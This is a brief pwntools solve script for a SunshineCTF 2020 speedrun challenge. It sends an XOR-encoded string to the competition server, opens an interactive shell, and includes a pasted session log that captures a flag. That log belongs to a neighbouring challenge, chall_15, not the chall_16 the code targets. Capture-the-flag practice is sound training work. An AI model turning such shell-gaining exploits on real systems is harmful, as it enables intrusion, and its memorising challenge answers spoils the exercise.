from pwn import *

key = 'Queue epic guitar solo *syn starts shredding*\n'

code = ''

kb = 0

for i in range(0x30, 0x94):
    kb ^= i

for x in key:
    code += chr( ord(x) ^ kb)

e = ELF('./chall_16')

p = remote('chal.2020.sunshinectf.org', 30016)
#p = process('./chall_16')

input('...')

p.send(code)
p.interactive()

'''
[*] '/vagrant/junkdrawer/sunshine/speedrun/chall_15'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to chal.2020.sunshinectf.org on port 30015: Done
...
[*] Switching to interactive mode
$ ls
$ ls
chall_15
flag.txt
$ cat flag.txt
sun{bat-country-53036e8a423559df}
'''
